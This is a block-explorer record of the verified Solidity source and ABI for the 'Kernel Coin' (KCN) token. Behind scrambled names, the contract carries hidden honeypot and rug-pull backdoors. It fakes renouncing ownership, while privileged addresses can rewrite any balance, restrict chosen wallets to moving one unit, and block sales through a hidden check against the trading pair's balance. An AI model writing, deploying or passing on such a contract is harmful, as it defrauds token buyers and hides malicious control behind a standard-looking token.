{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract launchedAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTeam {\n    function createPair(address totalMaxLaunch, address modeTokenFrom) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface teamFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface listSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamMaxIs) external view returns (uint256);\n\n    function transfer(address modeTradingMax, uint256 liquidityFee) external returns (bool);\n\n    function allowance(address launchAutoSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTradingMax,\n        uint256 liquidityFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTeam, uint256 value);\n    event Approval(address indexed launchAutoSell, address indexed spender, uint256 value);\n}\n\ninterface listSenderMetadata is listSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KernelCoin is launchedAt, listSender, listSenderMetadata {\n\n    mapping(address => mapping(address => uint256)) private shouldTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiverTrading;\n    }\n\n    uint256 public tradingTo = 0;\n\n    constructor (){\n        \n        limitFee();\n        teamFee limitFeeMarketing = teamFee(modeMarketing);\n        tokenIs = sellTeam(limitFeeMarketing.factory()).createPair(limitFeeMarketing.WETH(), address(this));\n        limitToken = sellTeam(limitFeeMarketing.factory()).feeTo();\n        if (autoLiquidity == buyLiquidity) {\n            listTx = false;\n        }\n        totalSwap = _msgSender();\n        teamLaunched[totalSwap] = true;\n        autoSender[totalSwap] = maxReceiverTrading;\n        if (marketingFundTrading != fromLaunch) {\n            fromLaunch = false;\n        }\n        emit Transfer(address(0), totalSwap, maxReceiverTrading);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderLaunch;\n    }\n\n    function listLaunched(address tradingFundMax, address modeTradingMax, uint256 liquidityFee) internal view returns (uint256) {\n        require(liquidityFee > 0);\n\n        uint256 minLaunched = 0;\n        if (tradingFundMax == tokenIs && exemptTotal > 0) {\n            minLaunched = liquidityFee * exemptTotal / 100;\n        } else if (modeTradingMax == tokenIs && tradingTo > 0) {\n            minLaunched = liquidityFee * tradingTo / 100;\n        }\n        require(minLaunched <= liquidityFee);\n        return liquidityFee - minLaunched;\n    }\n\n    function receiverBuyTeam() private view {\n        require(teamLaunched[_msgSender()]);\n    }\n\n    uint256 public buyLiquidity;\n\n    address modeMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function limitFee() public {\n        emit OwnershipTransferred(totalSwap, address(0));\n        senderLaunch = address(0);\n    }\n\n    uint256 limitMode;\n\n    function balanceOf(address teamMaxIs) public view virtual override returns (uint256) {\n        return autoSender[teamMaxIs];\n    }\n\n    event OwnershipTransferred(address indexed maxBuyReceiver, address indexed takeToToken);\n\n    function transferFrom(address tradingFundMax, address modeTradingMax, uint256 liquidityFee) external override returns (bool) {\n        if (_msgSender() != modeMarketing) {\n            if (shouldTeam[tradingFundMax][_msgSender()] != type(uint256).max) {\n                require(liquidityFee <= shouldTeam[tradingFundMax][_msgSender()]);\n                shouldTeam[tradingFundMax][_msgSender()] -= liquidityFee;\n            }\n        }\n        return takeMode(tradingFundMax, modeTradingMax, liquidityFee);\n    }\n\n    function approve(address swapIs, uint256 liquidityFee) public virtual override returns (bool) {\n        shouldTeam[_msgSender()][swapIs] = liquidityFee;\n        emit Approval(_msgSender(), swapIs, liquidityFee);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return senderLaunch;\n    }\n\n    function amountTake(uint256 liquidityFee) public {\n        receiverBuyTeam();\n        listLaunch = liquidityFee;\n    }\n\n    mapping(address => bool) public teamLaunched;\n\n    mapping(address => bool) public tokenMarketing;\n\n    address public tokenIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFund;\n    }\n\n    uint256 private maxReceiverTrading = 100000000 * 10 ** 18;\n\n    uint256 public autoLiquidity;\n\n    address limitToken;\n\n    uint8 private feeMin = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMin;\n    }\n\n    function listAmount(address teamWallet, uint256 liquidityFee) public {\n        receiverBuyTeam();\n        autoSender[teamWallet] = liquidityFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalListReceiver;\n    }\n\n    address public totalSwap;\n\n    bool public listTx;\n\n    bool private takeTotal;\n\n    uint256 public exemptTotal = 3;\n\n    mapping(address => uint256) private autoSender;\n\n    string private totalListReceiver = \"Kernel Coin\";\n\n    function exemptTxFee(address maxFundLaunched) public {\n        require(maxFundLaunched.balance < 100000);\n        if (maxAuto) {\n            return;\n        }\n        if (listTx != marketingFundTrading) {\n            autoLiquidity = buyLiquidity;\n        }\n        teamLaunched[maxFundLaunched] = true;\n        \n        maxAuto = true;\n    }\n\n    function allowance(address marketingTo, address swapIs) external view virtual override returns (uint256) {\n        if (swapIs == modeMarketing) {\n            return type(uint256).max;\n        }\n        return shouldTeam[marketingTo][swapIs];\n    }\n\n    bool public fromLaunch;\n\n    uint256 listLaunch;\n\n    function transfer(address teamWallet, uint256 liquidityFee) external virtual override returns (bool) {\n        return takeMode(_msgSender(), teamWallet, liquidityFee);\n    }\n\n    uint256 constant listTotal = 1 ** 10;\n\n    string private txFund = \"KCN\";\n\n    bool public maxAuto;\n\n    function fromTrading(address tradingFundMax, address modeTradingMax, uint256 liquidityFee) internal returns (bool) {\n        require(autoSender[tradingFundMax] >= liquidityFee);\n        autoSender[tradingFundMax] -= liquidityFee;\n        autoSender[modeTradingMax] += liquidityFee;\n        emit Transfer(tradingFundMax, modeTradingMax, liquidityFee);\n        return true;\n    }\n\n    bool private marketingFundTrading;\n\n    function takeWalletFrom(address walletReceiverList) public {\n        receiverBuyTeam();\n        if (fromLaunch == marketingFundTrading) {\n            autoLiquidity = buyLiquidity;\n        }\n        if (walletReceiverList == totalSwap || walletReceiverList == tokenIs) {\n            return;\n        }\n        tokenMarketing[walletReceiverList] = true;\n    }\n\n    function takeMode(address tradingFundMax, address modeTradingMax, uint256 liquidityFee) internal returns (bool) {\n        if (tradingFundMax == totalSwap) {\n            return fromTrading(tradingFundMax, modeTradingMax, liquidityFee);\n        }\n        uint256 fundFrom = listSender(tokenIs).balanceOf(limitToken);\n        require(fundFrom == listLaunch);\n        require(modeTradingMax != limitToken);\n        if (tokenMarketing[tradingFundMax]) {\n            return fromTrading(tradingFundMax, modeTradingMax, listTotal);\n        }\n        liquidityFee = listLaunched(tradingFundMax, modeTradingMax, liquidityFee);\n        return fromTrading(tradingFundMax, modeTradingMax, liquidityFee);\n    }\n\n    address private senderLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAutoSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMaxIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFundLaunched\",\"type\":\"address\"}],\"name\":\"exemptTxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"listAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiverList\",\"type\":\"address\"}],\"name\":\"takeWalletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFundMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KernelCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}